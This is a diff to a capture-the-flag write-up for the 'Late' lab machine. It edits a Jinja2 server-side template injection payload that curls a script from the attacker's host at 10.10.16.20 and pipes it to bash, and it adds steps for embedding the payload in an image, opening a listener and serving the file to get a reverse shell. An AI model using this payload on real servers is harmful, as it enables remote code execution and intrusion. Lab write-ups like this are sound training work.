@@ -101,8 +101,20 @@ wfuzz -u "http://late.htb" -H "Host: FUZZ.late.htb" -w SecLists/Discovery/DNS/su
 > What to send
 
 ```
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.16.20/shell | sh').read() }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.16.20/f | bash').read()}}
 ```
+
+#### NOTES:
+
+```
+Change "bash" to "sh" won't work. 
+```
+
+11. So what to do now is, convert the SSTI payload to image file, then set a listener on port 1337, lastly set python server (because we want to curl a file from our local machine). Send the image.
+
+> RESULT
+
+
 
 
 
